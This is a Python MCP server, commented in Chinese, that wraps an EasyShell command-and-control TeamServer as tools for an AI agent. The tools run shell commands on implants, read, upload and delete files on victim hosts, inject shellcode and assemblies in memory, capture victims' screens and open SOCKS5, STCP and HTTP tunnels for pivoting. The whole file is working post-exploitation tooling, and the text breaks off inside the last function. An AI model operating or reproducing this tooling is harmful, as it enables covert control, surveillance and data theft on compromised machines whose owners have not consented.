# ============================================================
# EasyShell MCP Server — 基于 easyshell_server 源码与 Web 前端逆向
#
# API 前缀: /prod-api/api
# 认证: Authorization2: Bearer <JWT>
# 可选: Authorization: Basic base64(user:pass)（登录与 Basic 开启时）
# 载荷: AES-256-GCM + RSA-OAEP(SHA-256) 封装（与 easyshell_web 一致）
#
# 环境变量:
#   EASYSHELL_URL      TeamServer 地址，如 http://127.0.0.1:8080
#   EASYSHELL_TOKEN    JWT（easyshell_config.py 登录后写入）
#   EASYSHELL_BASICAUTH 可选 Basic 头
# ============================================================

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re
import socket
import subprocess
import time
from pathlib import Path
from typing import Optional

import httpx
from mcp.server.fastmcp import FastMCP

from easyshell_api import EasyShellAPI, client_from_env

mcp = FastMCP("easyshell-c2", log_level="INFO")
logger = logging.getLogger("easyshell-mcp")

_api: Optional[EasyShellAPI] = None
_tunnels: dict[str, dict] = {}


def _get_api() -> EasyShellAPI:
    global _api
    if _api is None:
        _api = client_from_env()
    return _api


def _ok(resp: dict) -> bool:
    return resp.get("status") == 200


def _err(resp: dict) -> str:
    if isinstance(resp.get("data"), str):
        return resp["data"]
    return str(resp.get("error") or resp)


def _online_flag(val: str) -> bool:
    return str(val).strip() == "1"


async def _fetch_clients(api: EasyShellAPI) -> list[dict]:
    resp = await api.get("client/clientslist", params={"page": 1, "page_size": 9999})
    if not _ok(resp):
        return []
    return (resp.get("data") or {}).get("list") or []


async def _resolve_uid(api: EasyShellAPI, uid: str) -> str:
    """将 UID 前缀解析为完整 32 位 MD5；list_clients 展示截断时 MCP 调用方可能只传前缀。"""
    uid = uid.strip()
    if not uid:
        return uid
    items = await _fetch_clients(api)
    uids = [str(c.get("Uid", "")).strip() for c in items if c.get("Uid")]
    if uid in uids:
        return uid
    matches = [u for u in uids if u.startswith(uid)]
    if len(matches) == 1:
        return matches[0]
    if len(matches) > 1:
        raise ValueError(f"UID 前缀 {uid!r} 匹配多个客户端: {', '.join(matches)}")
    return uid


async def _fetch_tunnel_route(api: EasyShellAPI, uid: str) -> dict:
    """查询出口 UID 的多级 HOP 路由链（ParentUid 或显式 RouteChain）。"""
    resp = await api.get("socks5/route", params={"uid": uid})
    if not _ok(resp):
        return {}
    data = resp.get("data") or {}
    return data if isinstance(data, dict) else {}


def _format_route_hint(route_data: dict) -> str:
    chain = str(route_data.get("routeChain") or "").strip()
    hops = int(route_data.get("hopCount") or 0)
    if not chain:
        return "路由: 单跳"
    suffix = f" ({hops} 跳)" if hops > 1 else ""
    return f"路由: {chain}{suffix}"


def _format_upload_job(u: dict) -> str:
    name = str(u.get("fileName") or u.get("FileName") or "?")[:24]
    part = u.get("uploadPart", u.get("UploadPart", 0))
    size = u.get("fileSize") or u.get("FileSize") or "?"
    status = u.get("status") or u.get("State") or "?"
    err = u.get("error") or u.get("Error") or ""
    line = f"  {name:<24} | {part:>3}% | {size:<8} | {status}"
    if err:
        line += f" | {err}"
    return line


async def _wait_upload_dispatch(
    api: EasyShellAPI, uid: str, upload_id: str, *, timeout: float = 600.0
) -> tuple[bool, str]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        resp = await api.get("client/uploads/info", params={"uid": uid})
        if _ok(resp):
            for job in resp.get("data") or []:
                if str(job.get("uploadId", "")) != upload_id:
                    continue
                status = str(job.get("status") or "")
                if status == "done":
                    return True, "done"
                if status == "error":
                    return False, str(job.get("error") or "upload error")
        await asyncio.sleep(2)
    return False, "下发超时（植入体可能离线或 UID 不正确）"


def _parse_headers(text: str) -> dict[str, str]:
    headers: dict[str, str] = {}
    for line in text.strip().splitlines():
        line = line.strip()
        if line and ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def _truncate(text: str, limit: int = 12000) -> str:
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n...(截断，共 {len(text)} 字符)"


# ============================================================
# 截屏帮助函数（图片落本地 → 对话内可直接展示）
# ============================================================

def _screenshot_base_dir() -> Path:
    """截图默认保存目录：env EASYSHELL_SCREENSHOT_DIR 优先，否则 MCP 工作目录下 easyshell_screenshots。"""
    env_dir = os.environ.get("EASYSHELL_SCREENSHOT_DIR", "").strip()
    base = Path(env_dir) if env_dir else (Path.cwd() / "easyshell_screenshots")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _sniff_image_ext(data: bytes) -> str:
    """按文件头判断扩展名（PNG/JPEG），兜底 .png。"""
    if data[:3] == b"\xff\xd8\xff":
        return ".jpg"
    if data[:8] == b"\x89PNG\r\n\x1a\n":
        return ".png"
    return ".png"


def _safe_uid_part(uid: str, length: int = 12) -> str:
    return re.sub(r"[^0-9a-zA-Z]", "", uid)[:length] or "client"


def _save_screenshot(data: bytes, *, uid: str, tag: str = "screen") -> Path:
    """按 uid+时间戳写入默认截图目录，返回绝对路径。"""
    name = f"{tag}_{_safe_uid_part(uid)}_{time.strftime('%Y%m%d_%H%M%S')}{_sniff_image_ext(data)}"
    p = _screenshot_base_dir() / name
    p.write_bytes(data)
    return p


def _http_err_text(e: Exception) -> str:
    """从 httpx.HTTPStatusError 中提取服务端 error/message 文案。"""
    resp = getattr(e, "response", None)
    if resp is not None:
        try:
            d = resp.json()
            if isinstance(d, dict):
                for key in ("error", "message", "msg"):
                    val = d.get(key)
                    if val:
                        return str(val)
        except Exception:
            pass
        return f"HTTP {resp.status_code}"
    return str(e)


def _fmt_history_ts(ms) -> str:
    try:
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(ms) / 1000))
    except Exception:
        return str(ms)


# ============================================================
# MCP Tools
# ============================================================

@mcp.tool()
async def easyshell_server_info() -> str:
    """获取 EasyShell TeamServer 运行信息与能力（GOOS/GOARCH/UPX/SGN）。"""
    api = _get_api()
    try:
        runtime = await api.get("client/server-runtime")
        clients = await api.get("client/clientslist", params={"page": 1, "page_size": 9999})
        listeners = await api.get("listener/list")
    except Exception as e:
        return f"无法连接 {api.base_url}: {e}"

    online = 0
    total = 0
    if _ok(clients):
        lst = (clients.get("data") or {}).get("list") or []
        total = (clients.get("data") or {}).get("total") or len(lst)
        online = sum(1 for c in lst if _online_flag(c.get("Online", "")))

    listener_count = 0
    if _ok(listeners):
        listener_count = len(listeners.get("data") or [])

    rt = runtime.get("data") or {}
    lines = [
        "EasyShell TeamServer 运行中",
        f"  URL: {api.base_url}",
        f"  GOOS/GOARCH: {rt.get('goos', '?')}/{rt.get('goarch', '?')}",
        f"  在线植入体: {online}/{total}",
        f"  监听器: {listener_count}",
        f"  UPX 嵌入: {rt.get('upx_embedded', '?')}",
        f"  SGN 可用: {rt.get('sgn_available', '?')}",
    ]
    return "\n".join(lines)


@mcp.tool()
async def easyshell_list_clients(online_only: bool = True) -> str:
    """列出植入体客户端。

    Args:
        online_only: True=仅在线, False=全部
    """
    api = _get_api()
    resp = await api.get("client/clientslist", params={"page": 1, "page_size": 9999})
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"

    items = (resp.get("data") or {}).get("list") or []
    if online_only:
        items = [c for c in items if _online_flag(c.get("Online", ""))]

    if not items:
        return "没有匹配的客户端"

    lines = ["UID | 主机 | 内网IP | 外网IP | 用户 | 协议 | 在线"]
    lines.append("-" * 110)
    for c in items:
        flag = "+" if _online_flag(c.get("Online", "")) else "-"
        lines.append(
            "  %s %-32s | %-12s | %-15s | %-15s | %-10s | %-8s"
            % (
                flag,
                str(c.get("Uid", "?")),
                str(c.get("Computer", "?"))[:12],
                str(c.get("InternalIP", "?"))[:15],
                str(c.get("ExternalIP", "?"))[:15],
                str(c.get("Username", "?"))[:10],
                str(c.get("Listener", "?"))[:8],
            )
        )
    lines.append(f"共 {len(items)} 条")
    lines.append("提示: 下发命令/上传文件时请使用完整 UID（32 位）；仅前缀时也支持自动解析。")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_exec_cmd(uid: str, command: str, timeout: int = 30) -> str:
    """在植入体上执行 Shell 命令（下发后轮询 shell 缓冲区获取输出）。

    合并多条命令时用 `cmd /c "whoami&ipconfig"`（Windows）或 `;`（Linux）。

    Args:
        uid: 植入体 UID
        command: 命令
        timeout: 最长等待秒数
    """
    api = _get_api()
    try:
        uid = await _resolve_uid(api, uid.strip())
    except ValueError as e:
        return str(e)

    before = await api.get("client/shell/getshellcontent", params={"uid": uid, "_t": int(time.time() * 1000)})
    base = (before.get("data") or "") if _ok(before) else ""

    resp = await api.post("client/shell/sendcommand", json_body={"uid": uid, "command": command})
    if resp.get("status") not in (200, None) and resp.get("error"):
        return f"下发失败: {_err(resp)}"

    deadline = time.time() + min(timeout, 120)
    last = base
    while time.time() < deadline:
        await asyncio.sleep(1.0)
        cur_resp = await api.get("client/shell/getshellcontent", params={"uid": uid, "_t": int(time.time() * 1000)})
        if not _ok(cur_resp):
            continue
        cur = cur_resp.get("data") or ""
        if cur != last and len(cur) > len(base):
            out = _extract_new_output(base, cur, command)
            if out.strip():
                return out[:12000]
        last = cur

    final = await api.get("client/shell/getshellcontent", params={"uid": uid, "_t": int(time.time() * 1000)})
    if _ok(final):
        out = _extract_new_output(base, final.get("data") or "", command)
        if out.strip():
            return out[:12000]
    return "(超时或无新输出，请增大 timeout 或检查植入体协议/sleep)"


def _extract_new_output(base: str, full: str, command: str) -> str:
    if not full:
        return ""
    if full.startswith(base):
        delta = full[len(base):]
    else:
        delta = full
    delta = delta.strip()
    if not delta:
        return ""
    lines = delta.splitlines()
    cleaned = []
    for ln in lines:
        if ln.strip().startswith("$ " + command.split()[0][:20]):
            continue
        if ln.strip() == "$ " + command.strip():
            continue
        cleaned.append(ln)
    return "\n".join(cleaned).strip() or delta


@mcp.tool()
async def easyshell_list_dir(uid: str, path: str) -> str:
    """列出植入体目录（走 file/tree API，不创建 cmd.exe）。

    Args:
        uid: 植入体 UID（完整 32 位，或唯一前缀）
        path: 目录路径，Windows 用正斜杠如 C:/Users
    """
    api = _get_api()
    try:
        uid = await _resolve_uid(api, uid.strip())
    except ValueError as e:
        return str(e)
    resp = await api.post(
        "client/file/tree",
        json_body={"uid": uid, "dirPath": path, "forceRefresh": True},
        timeout=130,
    )
    if not _ok(resp):
        return f"列出失败: {_err(resp)}"
    data = resp.get("data")
    items: list = []
    if isinstance(data, dict):
        items = data.get("entries") or data.get("items") or data.get("children") or []
    elif isinstance(data, list):
        items = data
    if not items:
        return f"目录为空或不存在: {path}"
    lines = [f"{path} ({len(items)} 项):", ""]
    for f in items[:200]:
        if isinstance(f, dict):
            name = f.get("name") or f.get("Name") or "?"
            typ = str(f.get("type") or f.get("Type") or "").upper()
            is_dir = typ == "D" or f.get("isDir") or f.get("IsDir")
            size = f.get("size") or f.get("Size") or 0
            mark = "D" if is_dir else "F"
            lines.append(f"  [{mark}] {name}  {size}")
        else:
            lines.append(f"  {f}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_read_file(uid: str, path: str, max_bytes: int = 102400) -> str:
    """读取植入体上的文本文件（走 file/filecontent API）。

    Args:
        uid: 植入体 UID
        path: 完整文件路径，如 C:/result.txt
        max_bytes: 最大返回字节
    """
    api = _get_api()
    resp = await api.post(
        "client/file/filecontent",
        json_body={"uid": uid.strip(), "path": path},
        timeout=300,
    )
    if not _ok(resp):
        return f"读取失败: {_err(resp)}"
    content = resp.get("content") or ""
    if not content:
        return "(空文件)"
    raw = content.encode("utf-8", errors="replace")
    if len(raw) > max_bytes:
        return raw[:max_bytes].decode("utf-8", errors="replace") + f"\n...(截断，共 {len(raw)} bytes)"
    return content


@mcp.tool()
async def easyshell_memory_exec(
    uid: str,
    rel_path: str,
    mode: str = "inline-bin",
    args: str = "",
    os_type: str = "windows",
) -> str:
    """内存执行 Extensions 插件（inline-bin / execute-assembly / inline-execute 等）。

    Args:
        uid: 植入体 UID
        rel_path: Extensions 相对路径，如 easyshell_plugins/tools/fscan.exe
        mode: execute-assembly | inline-bin | shellcode-inject | inline-execute
        args: 参数字符串
        os_type: windows | linux
    """
    api = _get_api()
    resp = await api.post(
        "plugin/memory-exec",
        json_body={
            "uid": uid.strip(),
            "relPath": rel_path,
            "mode": mode,
            "args": args,
            "os": os_type,
        },
    )
    if resp.get("status") == 200:
        return f"已下发内存执行: {mode} {rel_path} args={args}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_start_socks5(
    uid: str,
    port: int = 0,
    username: str = "",
    password: str = "",
    force: bool = True,
    group_key: str = "",
) -> str:
    """为植入体创建 SOCKS5 隧道（端口开在 TeamServer 上，流量从植入体出口）。

    Args:
        uid: 植入体 UID
        port: 本地端口，0=自动选空闲端口
        username: SOCKS5 用户名（可空）
        password: SOCKS5 密码（可空）
        force: True 时若同 uid 已有隧道则先关闭再建
        group_key: 负载组键；同端口多 implant 填相同值可轮询分担（参考 frp group）
    """
    api = _get_api()
    uid = await _resolve_uid(api, uid.strip())

    if force:
        lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
        if _ok(lst):
            for t in (lst.get("data") or {}).get("list") or []:
                p = str(t.get("Socks5port", ""))
                u = t.get("UserName") or ""
                pw = t.get("Password") or ""
                await api.post("socks5/close", json_body={
                    "uid": uid, "Socks5port": p, "UserName": u, "Password": pw,
                })
                await api.post("socks5/delete", json_body={
                    "uid": uid, "Socks5port": p, "UserName": u, "Password": pw,
                })

    if port <= 0:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()

    resp = await api.post("socks5/start", json_body={
        "uid": uid,
        "Socks5port": str(port),
        "UserName": username,
        "Password": password,
        "Type": "socks5",
        "GroupKey": group_key.strip(),
    })
    if not _ok(resp):
        return f"建隧道失败: {_err(resp)}"

    route_hint = _format_route_hint(await _fetch_tunnel_route(api, uid))
    _tunnels[str(port)] = {"uid": uid, "port": port, "created_at": time.time(), "group_key": group_key.strip()}
    auth = ""
    if username:
        auth = f" --proxy-user {username}:{password}"
    gk = f" group={group_key}" if group_key.strip() else ""
    return f"SOCKS5 就绪: curl --socks5 127.0.0.1:{port}{auth} http://目标/{gk}\n{route_hint}"


@mcp.tool()
async def easyshell_start_stcp_tunnel(
    uid: str,
    local_port: int,
    target_addr: str,
    secret_key: str,
    force: bool = True,
) -> str:
    """创建 STCP 密钥隧道（TeamServer visitor 端口 + 植入体侧 tcp 转发，植入体无额外协议）。

    Visitor 连接方式：向 TeamServer:port 发送 32 字节 SHA256(secret_key)，随后为到目标的 TCP 流。

    Args:
        uid: 植入体 UID
        local_port: TeamServer visitor 端口，0=自动
        target_addr: 植入体可达的内网目标 host:port
        secret_key: STCP 密钥（至少 8 位）
        force: 同 uid 已有隧道时先关闭
    """
    api = _get_api()
    uid = uid.strip()
    if force:
        lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
        if _ok(lst):
            for t in (lst.get("data") or {}).get("list") or []:
                p = str(t.get("Socks5port", ""))
                u = t.get("UserName") or ""
                pw = t.get("Password") or ""
                await api.post("socks5/close", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
                await api.post("socks5/delete", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
    if local_port <= 0:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        local_port = s.getsockname()[1]
        s.close()
    resp = await api.post("socks5/start", json_body={
        "uid": uid,
        "Socks5port": str(local_port),
        "UserName": "",
        "Password": "",
        "Type": "forward",
        "TargetAddr": target_addr.strip(),
        "Sk": secret_key.strip(),
    })
    if _ok(resp):
        return f"STCP 就绪: visitor 连 TeamServer:{local_port}，首包 SHA256(sk) 32B，转发→ {target_addr}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_start_http_tunnel(
    uid: str,
    local_port: int,
    target_addr: str = "",
    username: str = "",
    password: str = "",
) -> str:
    """创建 HTTP 隧道（仅 TeamServer 解析 HTTP；植入体仍走既有 tcp/socks5 转发）。

    Args:
        uid: 植入体 UID
        local_port: TeamServer 端口，0=自动
        target_addr: 反向模式填内网 Web host:port；留空=HTTP CONNECT 正向代理
        username: CONNECT/SOCKS 认证（可空）
        password: 密码（可空）
    """
    api = _get_api()
    if local_port <= 0:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        local_port = s.getsockname()[1]
        s.close()
    body = {
        "uid": uid.strip(),
        "Socks5port": str(local_port),
        "UserName": username,
        "Password": password,
        "Type": "http",
        "TargetAddr": target_addr.strip(),
    }
    resp = await api.post("socks5/start", json_body=body)
    if _ok(resp):
        if target_addr.strip():
            return f"HTTP 反向代理: TeamServer:{local_port} → {target_addr}（经植入体）"
        auth = f" user={username}" if username else ""
        return f"HTTP CONNECT 代理: 配置 HTTP 代理 127.0.0.1:{local_port}{auth}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_stop_socks5(uid: str, port: int) -> str:
    """关闭并删除 SOCKS5 隧道。

    Args:
        uid: 植入体 UID
        port: 隧道端口
    """
    api = _get_api()
    body = {"uid": uid.strip(), "Socks5port": str(port), "UserName": "", "Password": ""}
    lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
    if _ok(lst):
        for t in (lst.get("data") or {}).get("list") or []:
            if str(t.get("Socks5port")) == str(port):
                body["UserName"] = t.get("UserName") or ""
                body["Password"] = t.get("Password") or ""
                break
    await api.post("socks5/close", json_body=body)
    await api.post("socks5/delete", json_body=body)
    _tunnels.pop(str(port), None)
    return f"已关闭 SOCKS5 127.0.0.1:{port}"


@mcp.tool()
async def easyshell_list_listeners() -> str:
    """列出 TeamServer 监听器配置。"""
    api = _get_api()
    resp = await api.get("listener/list", params={"page": 1, "page_size": 100})
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    data = resp.get("data") or {}
    if isinstance(data, list):
        items = data
        stats = ""
    else:
        items = data.get("list") or []
        stats = f" (运行 {data.get('running', '?')} / 停止 {data.get('stopped', '?')} / 共 {data.get('total', '?')})"
    if not items:
        return "无监听器"
    lines = [f"监听器{stats}:", "类型 | 监听地址 | 连接地址 | 状态", "-" * 80]
    for it in items:
        status = "运行" if it.get("Status") == 1 else "停止"
        lines.append(
            "  %-12s | %-18s | %-22s | %s"
            % (
                str(it.get("Type", "?"))[:12],
                str(it.get("ListenAddress", "?"))[:18],
                str(it.get("ConnectAddress", "?"))[:22],
                status,
            )
        )
    return "\n".join(lines)


# ============================================================
# 诊断 / 植入体管理
# ============================================================

@mcp.tool()
async def easyshell_diagnose() -> str:
    """诊断 EasyShell TeamServer 连接、JWT、curl 可用性。"""
    api = _get_api()
    lines = ["EasyShell MCP 诊断", "=" * 40]

    try:
        runtime = await api.get("client/server-runtime")
        if _ok(runtime):
            rt = runtime.get("data") or {}
            lines.append(f"TeamServer ({api.base_url}): 正常")
            lines.append(f"  GOOS/GOARCH: {rt.get('goos')}/{rt.get('goarch')}")
            lines.append(f"  UPX: {rt.get('upx_embedded')}  SGN: {rt.get('sgn_available')}")
        else:
            lines.append(f"TeamServer: 异常 — {_err(runtime)}")
    except Exception as e:
        lines.append(f"TeamServer ({api.base_url}): 无法连接 — {e}")

    try:
        clients = await api.get("client/clientslist", params={"page": 1, "page_size": 9999})
        if _ok(clients):
            lst = (clients.get("data") or {}).get("list") or []
            online = sum(1 for c in lst if _online_flag(c.get("Online", "")))
            lines.append(f"植入体: {online} 在线 / {len(lst)} 总数")
        else:
            lines.append(f"植入体列表: {_err(clients)}")
    except Exception as e:
        lines.append(f"植入体列表: {e}")

    try:
        tunnels = await api.get("socks5/list", params={"page": 1, "page_size": 50})
        if _ok(tunnels):
            cnt = len((tunnels.get("data") or {}).get("list") or [])
            lines.append(f"SOCKS5 隧道: {cnt} 条")
    except Exception as e:
        lines.append(f"SOCKS5: {e}")

    if _tunnels:
        lines.append(f"本 MCP 会话缓存隧道: {', '.join(_tunnels.keys())}")

    try:
        r = subprocess.run(["curl", "--version"], capture_output=True, text=True, timeout=5)
        lines.append(f"curl: {r.stdout.splitlines()[0].strip() if r.returncode == 0 else '不可用'}")
    except FileNotFoundError:
        lines.append("curl: 未安装（tunnel_curl 需要）")

    token = os.environ.get("EASYSHELL_TOKEN", "")
    lines.append(f"JWT: {'已配置' if token else '未配置'} ({len(token)} chars)")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_set_sleep(uid: str, sleep_seconds: int) -> str:
    """修改植入体 sleep 间隔（HTTP/DNS Beacon 回显加速）。

    Args:
        uid: 植入体 UID
        sleep_seconds: 新 sleep 秒数
    """
    api = _get_api()
    resp = await api.post("client/sleep", json_body={"uid": uid.strip(), "sleep": str(sleep_seconds)})
    if _ok(resp):
        return f"已设置 uid={uid} sleep={sleep_seconds}s"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_clear_shell(uid: str) -> str:
    """清空植入体 Shell 输出缓冲区。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    resp = await api.post("client/shell/clearshellcontent", json_body={"uid": uid.strip()})
    if _ok(resp):
        return f"已清空 uid={uid} 的 shell 缓冲区"
    return f"失败: {_err(resp)}"


# ============================================================
# 文件 / 进程 / 磁盘
# ============================================================

@mcp.tool()
async def easyshell_list_drives(uid: str) -> str:
    """列出植入体磁盘（走 drives API）。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    resp = await api.get("client/file/drives", params={"uid": uid.strip()}, timeout=130)
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    data = resp.get("data")
    if isinstance(data, list):
        items = data
    elif isinstance(data, dict):
        items = data.get("items") or data.get("children") or []
    else:
        items = []
    if not items:
        return "无磁盘信息"
    lines = [f"磁盘 ({len(items)}):"]
    for d in items[:50]:
        if isinstance(d, dict):
            name = d.get("name") or d.get("Name") or "?"
            lines.append(f"  {name}")
        else:
            lines.append(f"  {d}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_list_processes(uid: str) -> str:
    """列出植入体进程（走 pid API，下发 ps 命令）。

    Args:
        uid: 植入体 UID
    """
    api = _get_api()
    resp = await api.get("client/pid", params={"uid": uid.strip()}, timeout=310)
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    items = resp.get("data") or []
    if not items:
        return "无进程数据（植入体可能离线或超时）"
    lines = ["PID | PPID | 名称 | 架构 | 用户", "-" * 70]
    for p in items[:150]:
        if isinstance(p, dict):
            lines.append(
                "  %-6s | %-6s | %-20s | %-4s | %s"
                % (
                    str(p.get("PID", p.get("Pid", "?")))[:6],
                    str(p.get("PPID", p.get("PPid", "?")))[:6],
                    str(p.get("Name", "?"))[:20],
                    str(p.get("Arch", "?"))[:4],
                    str(p.get("User", "?"))[:20],
                )
            )
    lines.append(f"共 {len(items)} 条")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_upload_file(uid: str, local_path: str, remote_path: str) -> str:
    """上传本地文件到植入体（multipart，跳过加密）。

    Args:
        uid: 植入体 UID（完整 32 位，或唯一前缀）
        local_path: 本机文件绝对路径
        remote_path: 植入体目标完整路径（含文件名），如 C:/Users/Admin/Desktop/a.jpg
    """
    api = _get_api()
    try:
        uid = await _resolve_uid(api, uid.strip())
    except ValueError as e:
        return str(e)
    p = Path(local_path)
    if not p.is_file():
        return f"本地文件不存在: {local_path}"
    content = p.read_bytes()
    resp = await api.upload_multipart(
        "client/file/upload",
        fields={"uid": uid, "uploadPath": remote_path},
        file_field="file",
        file_content=content,
        filename=p.name,
        timeout=600,
    )
    if not _ok(resp):
        return f"上传失败: {_err(resp)}"
    data = resp.get("data") or {}
    upload_id = str(data.get("uploadId") or "")
    base = f"已入队: {p.name} → {remote_path} (uid={uid}, uploadId={upload_id}, {data.get('totalBytes')} bytes)"
    if not upload_id:
        return base + "\n警告: 未返回 uploadId，无法确认植入体是否收到"
    ok, detail = await _wait_upload_dispatch(api, uid, upload_id)
    if ok:
        return base + "\n上传完成: 文件已写入目标主机"
    return base + f"\n上传未完成: {detail}"


@mcp.tool()
async def easyshell_delete_file(uid: str, path: str) -> str:
    """删除植入体上的文件或目录。

    Args:
        uid: 植入体 UID
        path: 完整路径
    """
    api = _get_api()
    resp = await api.post(
        "client/file/delete",
        json_body={"uid": uid.strip(), "filePath": path},
        timeout=130,
    )
    if _ok(resp):
        return f"已删除: {path}"
    return f"删除失败: {_err(resp)}"


# ============================================================
# 屏幕截屏（REST 单次截屏 + 归档历史 → 本地图片，对话内展示）
#
# Web 端实时键鼠 / 录屏走 WebSocket（ws/screen），MCP 无法轮询；
# 但单次截屏 GET /client/screen/capture 是同步 REST，可完整复用，
# 截取结果保存为本地 PNG/JPG 后即可在对话中直接打开查看。
# ============================================================

@mcp.tool()
async def easyshell_screen_capture(
    uid: str,
    save_path: str = "",
    quality: int = 78,
    max_edge: int = 1440,
    archive: bool = True,
    timeout: int = 320,
) -> str:
    """远程截取植入体屏幕并保存为本地图片（对话中可直接展示）。

    同步等待植入体回包（慢 Beacon 可能耗时较长，服务器上限 300s）。
    成功后：1) 图片写入本机 easyshell_screenshots/（或 save_path）；
    2) archive=True（默认）同步归档到 TeamServer 截屏历史。

    Args:
        uid: 植入体 UID（支持唯一前缀）
        save_path: 本机保存路径（可空；默认 easyshell_screenshots/ 下 uid_时间戳.png|jpg）
        quality: JPEG 质量 1–100
        max_edge: 最长边像素 320–8192（越大越清晰、传输越慢）
        archive: 是否写入 TeamServer 截屏历史（与 Web「截屏」按钮一致）
        timeout: 最长等待秒数
    """
    api = _get_api()
    try:
        uid = await _resolve_uid(api, uid.strip())
    except ValueError as e:
        return str(e)
    params = {"uid": uid}
    if quality:
        params["quality"] = int(quality)
    if max_edge:
        params["maxEdge"] = int(max_edge)
    try:
        resp = await api.get(
            "client/screen/capture",
            params=params,
            timeout=min(max(int(timeout), 30), 320),
        )
    except Exception as e:
        return f"截屏失败: {_http_err_text(e)}（离线/无桌面会话/慢 Beacon 时查看 Shell 中 !Error，可加大 timeout）"
    if not _ok(resp):
        return f"截屏失败: {_err(resp)}"
    data = resp.get("data") or {}
    b64 = str(data.get("imageBase64") or "").strip()
    if not b64 or b64.startswith("{") or b64.startswith("["):
        return "截屏失败: 服务端未返回有效图像（常见 Windows 宿主无桌面会话 / GDI 截屏失败，见 Shell 中 !Error）"
    try:
        raw = base64.b64decode(b64)
    except Exception as e:
        return f"截屏失败: 图像 Base64 解码错误: {e}"
    if not raw:
        return "截屏失败: 图像数据为空"
    try:
        if save_path.strip():
            p = Path(save_path.strip())
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(raw)
        else:
            p = _save_screenshot(raw, uid=uid)
    except Exception as e:
        return f"截屏已取回但本地保存失败: {e}"

    try:
        sw = int(data.get("screenW") or 0)
        sh = int(data.get("screenH") or 0)
    except (TypeError, ValueError):
        sw = sh = 0
    mime = str(data.get("mime") or f"image/{_sniff_image_ext(raw).lstrip('.')}")
    dims = f"{sw}x{sh}" if sw > 0 and sh > 0 else "尺寸未知"
    lines = [
        f"截屏成功 uid={uid}（{dims}, {mime}, {len(raw)} bytes）",
        f"  本机图片: {p}",
        "  对话展示: 用图像查看能力打开上面的本地路径，即可在对话中查看并分析截图",
    ]
    if archive:
        try:
            hist = await api.post("client/screen/history", json_body={
                "uid": uid,
                "imageBase64": b64,
                "mime": mime,
                "screenW": sw,
                "screenH": sh,
                "source": "live",
            })
            if _ok(hist):
                hid = (hist.get("data") or {}).get("id") or "?"
                lines.append(f"  已归档: 历史 id={hid}（easyshell_screen_history / screen_history_get 可回看）")
            else:
                lines.append(f"  归档失败（不影响本地图片）: {_err(hist)}")
        except Exception as e:
            lines.append(f"  归档失败（不影响本地图片）: {_http_err_text(e)}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_screen_history(uid: str, page_size: int = 20) -> str:
    """列出 TeamServer 上某植入体的截屏归档（最新在前）。

    Args:
        uid: 植入体 UID（支持唯一前缀）
        page_size: 1–100
    """
    api = _get_api()
    try:
        uid = await _resolve_uid(api, uid.strip())
    except ValueError as e:
        return str(e)
    try:
        resp = await api.get(
            "client/screen/history",
            params={"uid": uid, "page": 1, "page_size": max(1, min(int(page_size), 100))},
        )
    except Exception as e:
        return f"查询失败: {_http_err_text(e)}"
    if not _ok(resp):
        return f"查询失败: {_err(resp)}"
    data = resp.get("data") or {}
    items = data.get("list") or []
    if not items:
        return f"uid={uid} 暂无截屏归档（先 easyshell_screen_capture 截一张，archive=True 自动入历史）"
    lines = ["id | 截屏时间 | 尺寸 | 大小 | 来源 | MIME", "-" * 76]
    for it in items:
        w, h = it.get("screenW") or 0, it.get("screenH") or 0
        dims = f"{w}x{h}" if w and h else "-"
        size = it.get("fileSize") or 0
        src = "live" if it.get("source") == "live" else "manual"
        lines.append(
            "  %-5s | %s | %-9s | %-8s | %-6s | %s"
            % (
                it.get("id", "?"),
                _fmt_history_ts(it.get("createdAt")),
                dims,
                size,
                src,
                it.get("mime", "?"),
            )
        )
    lines.append(f"共 {len(items)} 条；用 easyshell_screen_history_get(id) 下载到本机展示")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_screen_history_get(result_id: int, save_path: str = "") -> str:
    """把 TeamServer 截屏归档中的一张图下载到本机（对话中可直接展示）。

    Args:
        result_id: easyshell_screen_history 返回的 id
        save_path: 本机保存路径（可空；默认 easyshell_screenshots/ 下 history_<id>_<时间戳>.png|jpg）
    """
    api = _get_api()
    try:
        raw = await api.download_binary(
            "client/screen/history/file",
            params={"id": int(result_id), "inline": "1"},
            plain_query=True,
            timeout=60,
        )
    except Exception as e:
        return f"下载失败: {_http_err_text(e)}（id 需来自 easyshell_screen_history 输出）"
    if not raw:
        return f"下载失败: id={result_id} 为空或不存在"
    try:
        if save_path.strip():
            p = Path(save_path.strip())
            p.parent.mkdir(parents=True, exist_ok=True)
